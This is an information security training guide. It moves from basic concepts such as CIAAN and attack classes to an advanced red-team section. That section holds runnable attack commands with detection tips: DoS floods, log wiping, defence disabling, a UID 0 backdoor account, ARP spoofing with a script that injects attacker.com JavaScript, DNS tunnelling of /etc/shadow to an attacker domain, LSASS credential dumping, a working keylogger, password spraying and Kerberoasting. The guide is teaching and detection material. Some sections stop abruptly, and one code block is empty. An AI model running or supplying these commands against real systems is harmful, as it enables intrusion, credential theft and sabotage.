2. Beginner Level

Foundational concepts for practitioners new to information security. At the beginner level, you are learning to think in terms of targets and violations. You will internalize the CIAAN model (Confidentiality, Integrity, Availability, Authenticity, and Non-repudiation) not as abstract ideals, but as the five things an adversary tries to break, bypass, or steal.

Core Concepts

What Is Information Security?

Information security protects information and the systems that use, store, or transmit it from unauthorized access, disclosure, alteration, disruption, or destruction. Information is a critical asset. If sensitive data reaches the wrong hands, an organization can face financial loss, reputation damage, legal exposure, and loss of trust.

Elements of Information Security (CIAAN)

A common way to describe information security is the "CIAAN" model: Confidentiality, Integrity, Availability, Authenticity, and Non-repudiation. These elements help you understand what defenders protect and what adversaries try to break.

Element Meaning Example Controls
Confidentiality Only authorized parties can access the information. Data classification, encryption, access control, secure disposal.
Integrity Data stays accurate, complete, and protected from unauthorized change. Checksums, hashes, database constraints, versioning, change control.
Availability Systems and data remain accessible to authorized users when needed. Redundancy, clustering, anti-malware, DDoS protection, backups.
Authenticity You can prove that a user, system, document, or message is genuine. Strong authentication, biometrics, smart cards, digital certificates.
Non-repudiation Parties can't later deny actions such as sending, receiving, or approving. Digital signatures, signed logs, auditable transaction records.

Analogy / Context

Think of CIAAN as the five locks on a vault door. Confidentiality ensures only the right people have the key. Integrity ensures the contents haven't been swapped. Availability ensures you can actually open the vault when you need to. Authenticity ensures the key belongs to the person who claims to have it. Non-repudiation ensures that if someone opens the vault, they can't later deny they did it. An attacker wants to pick, bypass, or break as many of these locks as possible.

Confidentiality

Confidentiality ensures that only authorized entities can access information. Breaches can come from poor data handling, lost devices, exposed storage, weak permissions, misconfigurations, or hacking attempts.

  • Use data classification and handling procedures.
  • Encrypt data at rest and in transit.
  • Apply least privilege and secure media disposal.

Integrity

Integrity protects the accuracy and trustworthiness of data and resources. It stops improper or unauthorized changes and helps ensure that information remains fit for its purpose.

  • Use checksums and hashes to detect tampering.
  • Restrict updates and deletions through role-based access control.
  • Maintain audit logs and change control processes.

Availability

Availability ensures that systems responsible for delivering, storing, and processing information remain accessible when authorized users need them. DoS attacks, ransomware, hardware failures, and poor capacity planning can all target availability.

  • Use redundant hardware, clustering, and failover systems.
  • Monitor capacity and service health.
  • Maintain DDoS prevention, anti-malware, and tested backup and restore processes.

Authenticity

Authenticity confirms that communications, documents, users, and systems are genuine. It gives you confidence that an identity or message came from the claimed source.

  • Use multi-factor authentication for users and administrators.
  • Deploy smart cards, hardware tokens, and biometrics where appropriate.
  • Use PKI and digital certificates for systems and services.

Non-repudiation

Non-repudiation gives you proof that a sender sent a message, a recipient received it, or a user approved an action. It matters for accountability, investigations, and dispute resolution.

  • Use digital signatures on emails, documents, and transactions.
  • Protect logs with secure time-stamping and immutability.
  • Use auditable acceptance flows such as e-signatures and workflow approvals.

Information Security Attacks: Motives, Goals & Objectives

An attack is any action performed with the intent to breach an IT system's security by exploiting vulnerabilities. It may try to obtain, edit, remove, destroy, implant, or reveal information without authorization, or cause unexpected behavior in legitimate software or hardware.

Conceptually, you can think of an attack as:

Attack = Motive (Goal) + Method (TTP) + Vulnerability

Motives

Attackers act for specific reasons. Understanding those motives helps you prioritize defenses and response plans.

  • Disrupt business continuity or critical infrastructure.
  • Steal or manipulate information such as intellectual property, customer data, or financial records.
  • Create fear and chaos for ideological, religious, or political reasons.
  • Achieve state or military objectives such as espionage, sabotage, or influence operations.
  • Damage reputation or take revenge against individuals or organizations.
  • Obtain financial gain through fraud, ransomware, or extortion.

Tactics, Techniques & Procedures (TTPs)

Tactics, Techniques, and Procedures (TTPs) describe how real attackers operate. They show the patterns, behaviors, and workflows that define a threat actor's operational fingerprint. Understanding TTPs helps you recognize adversary behavior early, anticipate the next move, and build stronger detection and response strategies.

  • Tactics: The high-level objective of an attacker, such as initial access, lateral movement, or exfiltration.
  • Techniques: The specific methods used to achieve tactical goals, such as phishing, brute force, or exploiting a web vulnerability.
  • Procedures: The detailed steps threat actors follow during real operations.

In short: Tactics = why. Techniques = how. Procedures = the step-by-step. When you understand all three, you can read the adversary's path instead of reacting to isolated alerts.

Vulnerabilities (Weak Links in Systems)

A vulnerability is a weakness in the design, implementation, configuration, or operation of a system that an attacker can exploit to compromise security. It often acts as the entry point that lets an adversary bypass authentication, authorization, or other controls.

Common Reasons Vulnerabilities Exist

  • Hardware or software misconfiguration: Insecure defaults, open management interfaces, unencrypted protocols, and exposed services create security holes.
  • Insecure or poor design: Networks and applications that lack segmentation, proper authentication, or input validation are easier to compromise and harder to defend.
  • Inherent technology weaknesses: Legacy systems may not resist modern attacks, even when configured correctly.
  • End-user carelessness: Weak passwords, credential sharing, unsafe browsing, and social engineering increase attack success.
  • Intentional end-user acts: Malicious insiders or disgruntled ex-employees can abuse access to leak or sabotage data and systems.

3. Intermediate Level

At the intermediate level, you begin linking theoretical weaknesses to real attack classes. You will map specific vulnerability categories to attack classifications and learn to classify an attack by its observable behavior before selecting a defensive control.

Vulnerability Categories

Category Description
TCP/IP Protocol Weaknesses Core protocols such as HTTP, FTP, ICMP, SNMP, and SMTP were not designed with security as the default. They can lack authentication, encryption, and integrity controls, which makes them vulnerable to sniffing, spoofing, replay attacks, and misconfiguration abuse.
Operating System Vulnerabilities Operating systems may expose weaknesses through outdated kernels, insecure default services, or unpatched components. Missing updates and legacy subsystems often create reliable privilege-escalation paths for attackers.
Network Device Vulnerabilities Routers, switches, firewalls, and appliances can fail open when misconfigured or poorly maintained. Common risks include weak passwords, outdated firmware, insecure routing protocols, and overly permissive firewall rules.
User Account Weaknesses User credentials become a liability when transmitted insecurely, reused, or protected by weak passwords. Attackers frequently exploit leaked credentials, phishing, password spraying, and session hijacking.
System Account Weaknesses Privileged or service accounts with weak passwords, broad permissions, or unnecessary privileges present a high-value target. Their compromise often enables lateral movement or full domain control.
Internet Service Misconfiguration Misconfigured web and application services create immediate attack surfaces. Examples include risky features, default modules, unnecessary services, or poor IIS, Apache, Nginx, FTP, or terminal service configuration.
Default Passwords & Settings Many appliances, IoT devices, and admin interfaces ship with default credentials and settings. If unchanged, attackers can gain quick access using well-known manufacturer defaults.
Network Device Misconfiguration Incorrect ACLs, poor segmentation, exposed management interfaces, insecure VLAN setups, or misapplied route maps can grant unintended access or support lateral movement.

Classification of Attacks (IATF)

According to the Information Assurance Technical Framework (IATF), attacks can be grouped into five categories: Passive, Active, Close-in, Insider, and Distribution attacks.

Passive Attacks

Passive attacks intercept and monitor traffic without changing it. The attacker does not interact directly with the target system, which makes detection difficult.

  • Footprinting and OSINT collection.
  • Sniffing and eavesdropping on unencrypted traffic.
  • Network traffic analysis and metadata collection.
  • Decryption of weakly encrypted traffic.

Active Attacks

Active attacks tamper with data in transit, disrupt communication, or directly compromise systems. They send traffic to the target and are usually detectable when monitoring works properly.

  • DoS and DDoS attacks.
  • Malware deployment, including viruses, worms, ransomware, and trojans.
  • Spoofing, replay attacks, session hijacking, and man-in-the-middle attacks.
  • SQL injection, XSS, directory traversal, and OS or application exploits.
  • Password attacks, privilege escalation, and backdoor installation.

Close-In Attacks

Close-in attacks require physical proximity to the target system or network. The goal is to gather information, modify it, or disrupt access.

  • Eavesdropping or shoulder surfing to capture credentials.
  • Dumpster diving for discarded sensitive documents or media.
  • Connecting rogue devices to exposed ports or networks.

Insider Attacks

Insider attacks are carried out by trusted individuals with legitimate access to critical assets. They can bypass many perimeter defenses and may be hard to detect.

  • Theft of physical devices or confidential data.
  • Wiretapping or eavesdropping on internal communications.
  • Planting keyloggers, backdoors, or malware.
  • Abuse of privileged accounts or shared drives.

Distribution Attacks

Distribution attacks occur when hardware or software is tampered with before installation and use. This can happen at the vendor, in the supply chain, or during transit.

  • Backdoors inserted into firmware or software during manufacture.
  • Malicious code added to installation media or updates in transit.
  • Hardware implants that exfiltrate data or provide covert access.

Information Warfare (InfoWar)

Information warfare (InfoWar) uses information and communication technologies (ICT) to gain an advantage over an opponent. It includes offensive and defensive operations that target information, systems, decision-making, and perception.

Libicki's Categories of Information Warfare

Dr. Martin C. Libicki is a leading American defense analyst, scholar, and author specializing in cyberwarfare, information technology, and national security. He has authored multiple influential books and foundational monographs on digital conflict, including What Is Information Warfare? (1995), Conquest in Cyberspace (2007), Cyberdeterrence and Cyberwar (2009), and Cyberspace in Peace and War (2016).

  • Command and Control (C2) warfare: Disrupts, degrades, or takes over an opponent's command and control systems while protecting your own.
  • Intelligence-based warfare: Uses sensors and data-driven operations to corrupt, deny, or dominate information needed to control the battlespace.
  • Electronic warfare: Uses radio-electronic and cryptographic techniques to interfere with communications and sensing systems.
  • Psychological warfare: Uses propaganda, disinformation, and intimidation to demoralize or manipulate adversaries.
  • Hacker warfare: Targets information systems through malware, exploits, and penetration techniques to steal, disrupt, or manipulate data and services.
  • Economic warfare: Disrupts or manipulates information flows that support financial and commercial systems.
  • Cyberwarfare: Includes information terrorism, semantic attacks, and simulated or demonstrative operations.

Offensive vs Defensive Information Warfare

  • Defensive InfoWar: Strategies and actions taken to protect your own Information and Communications Technology (ICT) assets from attack.
  • Offensive InfoWar: Actions aimed at degrading, disrupting, or exploiting an opponent's Information and Communications Technology (ICT) assets.

4. Advanced / Operator Level

At the advanced level, you are preparing for adversary emulation and red team operations. The phased adversarial methodology; Denial, Change, Steal, Entry, Expand, and Stay becomes your operational planning framework.

Phased Adversarial Methodology: The Adversary's Lens on Information Security

Information security concepts become easier to understand when you view them as things an adversary wants to break, bypass, or use. The CIAAN model isn't just a definition set. It is a map of targets. Each element represents a defensive goal and an attacker objective.

Use this method to connect theory to real attack paths. You start with what the adversary wants, then identify which security principle they are trying to violate.

Phase 1: Disruption & Availability (The Denial Vector)

Adversarial goal: Make the target unusable to force attention, create pressure, or cause chaos.

  • Core concept: Availability.
  • DoS/DDoS: Overwhelm bandwidth, infrastructure, or application resources until services fail.
  • Ransomware: Encrypt data and deny access until the victim pays or restores from backups.
  • Wiper malware: Destroy data to create long-term outage and operational damage.
  • Key techniques: Traffic flooding, resource exhaustion, destructive malware, and data encryption.

Phase 1: Disruption & Availability (The Deny Vector)

Adversarial goal: Deny access to systems, data, or services to inflict operational or financial damage.

  • Core concept: Availability.
  • Volumetric attacks: Exhaust bandwidth, connection tables, or compute resources to render services unreachable.
  • Resource exhaustion: Abuse application or system features to consume disk, memory, or CPU until failure.
  • Ransomware: Encrypt files to deny access and weaponize recovery as leverage.
  • Key techniques: SYN flooding, low-and-slow application-layer attacks, disk-space exhaustion, and cryptographic denial.

Adversarial Examples: Phase 1 — Disruption & Availability

⚠️ Threat Intelligence Context: The following examples represent real-world adversary tradecraft observed in enterprise intrusions. They are documented here for defensive analysis and detection engineering in authorized environments only.

Example 1.1: Network Denial-of-Service

Adversary Objective: Degrade or eliminate service availability by exhausting network or transport-layer resources.

An adversary leverages volumetric SYN floods to overwhelm a target's TCP connection backlog, causing legitimate handshake requests to drop. To evade volume-based detection, they may alternatively employ low-and-slow attacks—such as Slowloris or RUDY—which open minimal connections and hold them open indefinitely with partial requests.

# Volumetric SYN flood to exhaust TCP backlog (authorized testing only)
hping3 -S --flood -p 80 <target>

# Low-and-slow application-layer attack to evade threshold detection
slowhttptest -c 1000 -H -g -o slowhttp_stats -u http://<target>/

# Validate service degradation from the attacker's position
curl -s -o /dev/null -w "%{http_code} %{time_total}\n" http://<target>/
🎯 Key Takeaway: DoS attacks target availability by exhausting finite resources—bandwidth, connections, or application threads. Adversaries balance volume against stealth, preferring low-and-slow techniques that remain below alerting thresholds. Detection opportunities: Baseline connection rates and alert on deviations; enable SYN cookies (tcp_syncookies) to mitigate SYN floods; monitor for incomplete HTTP requests held open beyond normal timeouts; correlate latency spikes with connection volume anomalies.

Example 1.2: Ransomware Deployment

Adversary Objective: Encrypt critical files to deny access and extort payment for restoration.

An adversary deploys a file-encryption payload that traverses target directories, encrypts data in-place or renames files with a controlled extension, drops a ransom note, and exfiltrates the recovery key to attacker-controlled infrastructure. Prior to encryption, they may terminate backup processes and shadow-copy services to complicate recovery. Living-off-the-land binaries (e.g., BitLocker, cipher, or legitimate libraries) are often used to minimize detection.

# Representative payload logic (PSEUDOCODE — for detection engineering only)
# WARNING: This is not functional code. It illustrates adversary logic.

FUNCTION deploy_ransomware(target_directory):
    key = generate_encryption_key()
    cipher = initialize_cipher(key)

    FOR each file IN target_directory (recursive):
        plaintext = read_file(file)
        ciphertext = cipher.encrypt(plaintext)
        write_file(file + ".locked", ciphertext)
        delete_original(file)
        # Detection opportunity: mass file extension changes in short windows

    # Drop ransom note in every affected directory
    write_note(target_directory, "Files encrypted. Contact: attacker@onion")

    # Exfiltrate recovery key to C2 infrastructure
    http_post(c2_endpoint, {"host": system_hostname, "key": key})
END FUNCTION
🎯 Key Takeaway: Ransomware weaponizes availability by cryptographically denying access to data. Attackers prioritize:
  • Backup destruction: Deleting shadow copies and backup catalogs before encryption
  • LOLBins: Using native encryption tools to avoid binary detection
  • Double extortion: Threatening data leaks alongside encryption
  • Key exfiltration: Recovery keys are never stored locally; they are held for ransom
Detection opportunities: Monitor for mass file modification events within short windows; alert on rapid file extension changes; detect termination of backup/VSS processes; and baseline normal file-write velocity per endpoint.

Example 1.3: Resource Exhaustion

Adversary Objective: Consume disk, memory, or CPU to cause cascading service failures.

An adversary abuses application features such as unauthenticated file uploads to fill filesystems and trigger denial-of-service conditions. Unlike volumetric DDoS, this operates within legitimate application logic, making it difficult to distinguish from benign activity. Disk exhaustion can also prevent logging, creating a secondary anti-forensic effect.

# Generate a large payload
dd if=/dev/zero of=payload.bin bs=1M count=100

# Abuse an unrestricted upload endpoint to exhaust disk space
for i in $(seq 1 100); do
  curl -X POST http://<target>/upload -F "file=@payload.bin" -s -o /dev/null
done

# Observe service degradation and disk saturation
df -h /var/www/uploads
curl -s -o /dev/null -w "%{http_code}\n" http://<target>/
🎯 Key Takeaway: Resource exhaustion is a subtle denial-of-service vector that abuses application trust. Filling disks stops logging, prevents writes, and can crash services. Detection opportunities: Monitor disk utilization thresholds; enforce upload size limits and directory quotas; alert on abnormal file-creation velocity; and ensure log rotation with size caps to prevent log-induced exhaustion.

Example 1.4: Blue Team — Defensive Countermeasures

Objective: Detect, disrupt, and recover from availability attacks.

Detection Rules & Monitoring

# Linux: Rate-limit inbound TCP connections per source
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j DROP

# Enable SYN cookies to mitigate SYN flood attacks
sysctl -w net.ipv4.tcp_syncookies=1

# Monitor for disk exhaustion
df -h | awk '$5 >= 90 {print "ALERT: " $6 " is " $5 " full"}'

# Windows: Detect large-scale file modifications (PowerShell)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4663} |
    Where-Object { $_.Message -match "\.(doc|xls|pdf).*WriteData" }

Phase 2: Integrity Violation & Corruption (The Change Vector)

Adversarial goal: Alter data or systems to mislead users, hide activity, or prepare deeper access.

  • Core concept: Integrity.
  • Data manipulation: Change financial records, log files, or configuration settings.
  • Supply chain attacks: Inject malicious code into legitimate software updates before they reach the target.
  • Man-in-the-middle attacks: Alter data in transit between a client and server.
  • Key techniques: Log tampering, binary patching, certificate spoofing, and unauthorized configuration change.

Adversarial Examples: Phase 2 — Integrity Violation & Corruption

⚠️ Threat Intelligence Context: The following examples represent real-world adversary tradecraft observed in enterprise intrusions. They are documented here for defensive analysis and detection engineering in authorized environments only.

Example 2.1: Log Tampering & Anti-Forensics

Adversary Objective: Erase evidence of compromise and disrupt forensic timeline reconstruction by selectively deleting log entries, clearing Windows event logs, or altering file timestamps.

After gaining privileged access, an adversary removes indicators of their presence from local logs. On Linux, they use stream editors to purge their source IP or specific command lines from auth.log, syslog, or audit.log. Timestamps are stomped to confuse timeline analysis. On Windows, the Security log is cleared entirely—accepting the generation of Event ID 1102—to destroy the audit trail.

# Linux: Remove all lines containing the adversary's source IP
sed -i '/<attacker-ip>/d' /var/log/auth.log
grep -vE "sshd.*Accepted|sudo.*COMMAND" /var/log/auth.log > /tmp/syslog.tmp && mv /tmp/syslog.tmp /var/log/auth.log

# Stomp timestamps to obscure forensic ordering
touch -t 202501010000 /var/log/syslog
touch -r /bin/ls /var/log/audit/audit.log

# Windows: Clear the Security log (triggers Event ID 1102)
wevtutil cl Security

# Windows: Stop the EventLog service to suppress new events temporarily
net stop eventlog

# Abuse log rotation: force rotation then delete archived logs
logrotate -f /etc/logrotate.conf
rm -f /var/log/auth.log.* /var/log/syslog.*
🎯 Key Takeaway: Log tampering is a post-exploitation priority. Adversaries avoid wholesale destruction when possible, preferring surgical removal of specific sessions or IPs to avoid obvious gaps. Detection opportunities: Centralized SIEM with immutable forwarding (syslog/TLS to WORM storage); file integrity monitoring on log files; Windows Event ID 1102 (Audit Log Cleared); gaps in log sequence numbers; and filesystem timeline anomalies via MACB analysis.

Example 2.2: Configuration Manipulation & Security Degradation

Adversary Objective: Modify system and service configurations to weaken defenses, enable persistent access, or prepare for credential harvesting.

An adversary rewrites SSH daemon settings to permit root login via password, punches firewall holes for command-and-control traffic, and manipulates the Windows registry to disable security features. Enabling the WDigest UseLogonCredential setting forces Windows to store plaintext passwords in LSASS, facilitating future credential extraction.

# Linux: Enable root login and password auth in SSH
sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
systemctl restart sshd

# Linux: Add iptables rules to allow C2 traffic
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT

# Windows: Force plaintext credential caching in LSASS
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f

# Windows: Disable real-time protection (if tamper protection is off)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Windows: Registry Run key persistence
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v UpdateService /t REG_SZ /d "C:\Windows\Temp\svchost.exe" /f
🎯 Key Takeaway: Configuration changes are low-noise compared to dropping binaries. By degrading security controls and enabling weak authentication, adversaries create hidden footholds and widen the attack surface. Detection opportunities: Configuration drift detection via SCCM, Chef, Puppet, or Ansible; file integrity monitoring on sshd_config; Windows Event IDs 4657 (Registry Value Modified) and 13 (Sysmon); and EDR alerts on security-tool tampering.

Example 2.3: Man-in-the-Middle & Content Injection

Adversary Objective: Intercept and alter data in transit to harvest credentials, inject malicious content, or downgrade encrypted sessions.

Positioned on the same local subnet, the adversary poisons ARP caches to redirect traffic through their machine. Unencrypted HTTP traffic is modified in real time, swapping benign download links for malicious payloads or injecting JavaScript keyloggers. If the opportunity arises, HTTPS connections are downgraded to plaintext via SSL stripping.

# Enable IP forwarding to pass traffic while sniffing
sysctl -w net.ipv4.ip_forward=1

# ARP spoofing: position between client and gateway
arpspoof -i eth0 -t <client-ip> <gateway-ip> &
arpspoof -i eth0 -t <gateway-ip> <client-ip> &

# Mitmproxy: inject arbitrary content into HTTP responses
cat > /tmp/inject.py << 'EOF'
from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "text/html" in (flow.response.headers.get("content-type", "")):
        flow.response.text = flow.response.text.replace(
            "<title>Corporate Portal</title>",
            "<title>Corporate Portal</title><script src='http://attacker.com/k.js'></script>"
        )
EOF
mitmproxy --mode transparent --showhost -s /tmp/inject.py
🎯 Key Takeaway: MITM attacks exploit trust in the network layer. Adversaries combine ARP poisoning with content injection or SSL stripping to manipulate data without immediate detection. Detection opportunities: Enforce HTTPS with HSTS and certificate pinning; monitor for gratuitous ARP replies and duplicate MAC/IP mappings; deploy 802.1X and dynamic ARP inspection (DAI); alert on rapid SSL/TLS downgrade events.

Example 2.4: File Integrity & Binary Manipulation

Adversary Objective: Subvert trust in system utilities and create hidden persistence by manipulating authentication databases and replacing critical binaries.

An adversary creates a backdoor user with UID 0 by appending directly to /etc/passwd and /etc/shadow, then grants passwordless sudo privileges.
To evade detection, they replace common system utilities such as ps, netstat, and ls with trojaned versions that filter out attacker processes and files. The immutable attribute (chattr +i) is set to prevent administrators or package managers from restoring the original binaries.

# Create a UID 0 backdoor account
echo "sysmaint:x:0:0::/root:/bin/bash" >> /etc/passwd
openssl passwd -1 -salt 12345678 backdoor
echo "sysmaint:\$1\$12345678\$abcdefgHIJKLmnoPqrSTU1:0:0:99999:7:::" >> /etc/shadow

# Grant passwordless sudo to the adversary-controlled user
echo "sysmaint ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Replace system binaries to hide attacker artifacts
# (adversary compiles or copies trojaned ps/netstat/ls that filter specific PIDs/files)
cp /tmp/trojan_ps /bin/ps
cp /tmp/trojan_netstat /bin/netstat

# Lock trojaned binaries to prevent replacement
chattr +i /bin/ps
chattr +i /bin/netstat

# Verify immutability
lsattr /bin/ps /bin/netstat
# Expected: ----i---------e------- /bin/ps
🎯 Key Takeaway: File integrity attacks subvert the very tools defenders use to investigate. Phase 3: Confidentiality Breach & Exposure (The Steal Vector)

Adversarial goal: Extract sensitive information without being detected.

  • Core concept: Confidentiality.
  • Data exfiltration: Move data out of the network through DNS tunnels, HTTP POST requests, or cloud sync tools.
  • Eavesdropping: Sniff unencrypted traffic on local networks or wireless networks.
  • Credential harvesting: Steal passwords, keys, tokens, or session material from memory, disk, or user input.
  • Key techniques: Packet capture, DNS tunneling, keylogging, token theft, and memory dumping.

Example 3.1: Data Exfiltration via DNS Tunneling

Adversary Objective: Move stolen data out of a restricted network by encapsulating it in DNS queries, bypassing outbound firewall restrictions.

An adversary on a compromised host leverages the fact that DNS traffic is rarely blocked. Tools like dnscat2 establish a covert command-and-control channel over TXT and A records, while iodine encapsulates raw IP traffic inside DNS queries and responses. Data is typically encoded as Base64 or hexadecimal within long subdomains.

# Establish a C2 session via DNS, tunneling command output
./dnscat2 --dns server=<attacker-domain>,port=53 --secret=<key> --exec "cat /etc/shadow" <attacker-domain>

# Create an IP-over-DNS tunnel for bulk exfiltration
iodine -f -P <tunnel_password> <attacker-ip> <tunnel-domain>

# Observe encoded data in DNS query subdomains
tcpdump -i eth0 -n port 53 -v
# Example capture: A? aGVsbG8gd29ybGQ=.<tunnel-domain>
🎯 Key Takeaway: DNS tunneling abuses permitted outbound traffic to exfiltrate data and maintain C2. Adversaries favor:
  • dnscat2: Interactive shell and file transfer over DNS
  • iodine: Full IP tunneling over DNS
  • Encoding: Base64, hex, or custom schemes to evade simple DLP
  • Low-and-slow: Long intervals between queries to avoid volume thresholds
Detection opportunities: Monitor for anomalous DNS query volume, long subdomains (>100 characters), TXT records with encoded payloads, and DNS traffic directed to non-corporate resolvers.

Example 3.2: Network Eavesdropping & Credential Sniffing

Adversary Objective: Harvest credentials and sensitive information by capturing unencrypted network traffic.

An adversary with access to a local subnet passively captures traffic or actively poisons ARP tables to position themselves between a victim and their gateway. Unencrypted protocols—HTTP, FTP, Telnet, SMTP, POP3 transmit credentials and data in plaintext.

# Passive capture of cleartext protocols
tcpdump -i eth0 -w capture.pcap tcp port 80 or tcp port 21 or tcp port 23 or tcp port 110

# Active ARP spoofing to intercept client-gateway traffic
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t <client-ip> <gateway-ip> &
arpspoof -i eth0 -t <gateway-ip> <client-ip> &

# Extract HTTP POST credentials from a pcap
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.request.uri -e data-text-lines

# Extract FTP passwords
tshark -r capture.pcap -Y "ftp.request.command == PASS" -T fields -e ftp.request.arg
🎯 Key Takeaway: Eavesdropping exploits the absence of encryption to steal data in transit. Adversaries target:
  • HTTP: Plaintext credentials in POST requests
  • FTP/Telnet: Unencrypted command channels and terminal sessions
  • Email (POP3/IMAP/SMTP): Mailbox credentials and content
  • LLMNR/NBT-NS: Broadcast name resolution poisoning for hash capture
Detection opportunities: Enforce TLS everywhere (HTTPS, SFTP, SSH), deploy network segmentation, monitor for gratuitous ARP activity, and detect interfaces entering promiscuous mode.

Example 3.3: LSASS Memory Dumping & Credential Extraction

Adversary Objective: Extract passwords, NTLM hashes, and Kerberos tickets from Windows LSASS process memory.

The Local Security Authority Subsystem Service (LSASS) caches credential material for active sessions. An adversary with administrative privileges dumps LSASS memory to disk for offline parsing, or injects a reflectively loaded tool to extract secrets in-place. On modern systems, Protected Process Light (PPL) may block direct access; adversaries may bring vulnerable drivers to disable PPL before dumping.

# Dump LSASS memory to disk using Sysinternals procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# In-memory credential extraction with Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export

# Remote extraction via Impacket (requires valid creds or hash)
netexec smb <target> -u <user> -p <password> --lsa
secretsdump.py <domain>/<user>:'<password>'@<target>
🎯 Key Takeaway: LSASS dumping is the cornerstone of credential harvesting in Windows environments. Adversaries obtain:
  • Plaintext passwords: Via wdigest or kerberos structures (if enabled)
  • NTLM hashes: For Pass-the-Hash lateral movement
  • Kerberos tickets: For Pass-the-Ticket and Golden/Silver ticket attacks
Detection opportunities: Monitor Event ID 4663/4656 for LSASS access, Sysmon Event ID 10, and Event ID 1001 (Credential Guard blocked). Enable Windows Credential Guard to isolate LSASS, and detect known vulnerable drivers used to bypass PPL.

Example 3.4: Keystroke Capture (Keylogging)

Adversary Objective: Record user keystrokes to harvest passwords, secrets, and communications.

Keyloggers may be user-mode applications hooking Windows message queues, PowerShell scripts leveraging native APIs, or Linux input device monitors. The goal is silent, continuous capture of all keyboard input to a file or exfiltration channel.

# PowerShell keylogger using GetAsyncKeyState (high-order bit check)
$code = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
public class KeyLogger {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    public static void Main() {
        while(true) {
            Thread.Sleep(100);
            for(int i = 32; i < 127; i++) {
                if((GetAsyncKeyState(i) & 0x8000) != 0) {
                    Console.Write((char)i);
                }
            }
        }
    }
}"@
Add-Type -TypeDefinition $code
[KeyLogger]::Main() | Out-File C:\Windows\Temp\syslog.bin -Append

# Linux: Capture raw input events
logkeys -s -o /var/log/.kernel_mod.log

# Alternative: Python cross-platform hook (requires pynput/keyboard module)
python -c "import keyboard; keyboard.on_press(lambda e: open('/tmp/.cache','a').write(e.name+'\n')); keyboard.wait()"
🎯 Key Takeaway: Keyloggers bypass encryption by capturing data before it is protected. Adversary techniques include:
  • PowerShell / .NET hooks: Living-off-the-land with no binary dropped
  • Linux input device monitoring: Reading /dev/input/event*
  • Hardware implants: USB or PS/2 inline keyloggers
Detection opportunities: EDR alerts on SetWindowsHookEx, unexpected access to input devices, and PowerShell block logging of suspicious GetAsyncKeyState usage.

Example 3.5: Session Token Theft & Hijacking

Adversary Objective: Steal session identifiers from traffic or browser storage to access protected resources without credentials.

When applications transmit session cookies over unencrypted HTTP or fail to mark cookies as HttpOnly, an adversary positioned on the network can capture and replay them. Tokens may also be extracted from compromised endpoints via browser credential stores or process memory.

# Capture session cookies from unencrypted HTTP traffic

🎯 Key Takeaway: Session tokens are cryptographic stand-ins for identity. If stolen, they grant the adversary the same access as the legitimate user until expiration or revocation. Detection opportunities: Implement Secure, HttpOnly, and SameSite cookie attributes; enforce HTTPS with HSTS; monitor for token reuse from abnormal geolocations or user agents; implement short session timeouts.

Phase 4: Authentication Bypass & Identity Theft (The Entry Vector)

Adversarial goal: Prove an identity, even when the attacker does not own it.

  • Core concept: Authentication.
  • Credential stuffing and brute force: Try known, leaked, or guessed passwords against login portals.
  • Session hijacking: Steal a valid session cookie or token to impersonate an active user.
  • MFA fatigue: Send repeated approval requests until a user accepts one.
  • Key techniques: Replay attacks, token theft, phishing for one-time codes, and Kerberoasting.

Adversarial Examples: Phase 4 — Authentication Bypass & Identity Theft

⚠️ Threat Intelligence Context: The following examples represent real-world adversary tradecraft observed in enterprise intrusions. They are documented here for defensive analysis and detection engineering in authorized environments only.

Example 4.1: Credential Stuffing & Password Spraying

Adversary Objective: Obtain initial access by exploiting weak or reused credentials without triggering account lockouts.

An adversary harvests usernames from LinkedIn, company email conventions, or prior breach dumps. Instead of brute-forcing a single account (which risks lockout), they spray one common password across many accounts during a narrow window.

# Spray a single password against many domain accounts via SMB
netexec smb <target> -u usernames.txt -p '<password>' --continue-on-success

# Target an exposed HTTP login portal with Hydra
hydra -L usernames.txt -P passwords.txt <target> http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=Invalid"

# Brute-force a known local admin account over SSH
hydra -l <user> -P passwords.txt ssh://<target>
🎯 Key Takeaway: Password spraying exploits weak password hygiene and avoids lockout thresholds by distributing attempts across many identities. Credential stuffing replays passwords leaked from third-party breaches. Detection opportunities: Multiple failed logons (Event ID 4625) across disparate usernames from a single source; impossible travel; successful logons immediately following a spray pattern.

Example 4.2: Kerberoasting

Adversary Objective: Extract service account credentials from Active Directory by requesting crackable Kerberos TGS tickets.

With any valid domain account, an adversary queries LDAP for Service Principal Names (SPNs). Each SPN represents an account running a service. The adversary requests a TGS ticket for each SPN, which is encrypted with the service account's password. Offline cracking of this ticket reveals the plaintext password.

# Enumerate SPNs and request TGS tickets
GetUserSPNs.py <domain>/<user>:'<password>' -request -outputfile kerberoast.txt

# Crack the exported TGS tickets (Hashcat mode 13100)
hashcat -m 13100 kerberoast.txt -a 0 wordlist.txt --show
🎯 Key Takeaway: Kerberoasting attacks service accounts, which often have weak passwords and rarely expire. RC4-encrypted tickets are fastest to crack offline. Detection opportunities: Monitor Event ID 4769 for unusual TGS requests, especially from non-service hosts; enforce AES encryption for service accounts; use group Managed Service Accounts (gMSA) with automatic password rotation.

Example 4.3: AS-REP Roasting

Adversary Objective: Abuse accounts that have "Do not require Kerberos preauthentication" enabled to harvest crackable AS-REP hashes without needing any prior credentials.

